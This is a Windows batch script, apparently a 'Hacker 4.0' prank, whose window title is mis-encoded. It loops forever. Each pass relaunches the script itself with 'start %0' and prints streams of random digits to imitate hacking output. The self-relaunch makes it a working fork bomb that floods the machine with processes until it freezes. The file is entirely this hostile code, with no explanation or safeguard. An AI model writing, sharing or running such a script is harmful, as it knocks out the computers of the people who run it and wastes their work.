@echo off 
title ¨t²Î¯}Ãa
color c
:a
start "Hacker 4.0" %0
set /a a=%random%%%60000+10000
set /a b=%random%%%60000+20000
set /a c=%random%%%60000+30000
set /a d=%random%%%60000+40000
set /a e=%random%%%60000+50000
echo %b%%e%%a%%c%%c%%b%%a%%d%%b%%c%%a%%b%%e%%b%%d%
echo %a%%c%%d%%e%%b%%a%%c%%e%%e%%a%%b%%a%%c%%d%%b%
goto a 
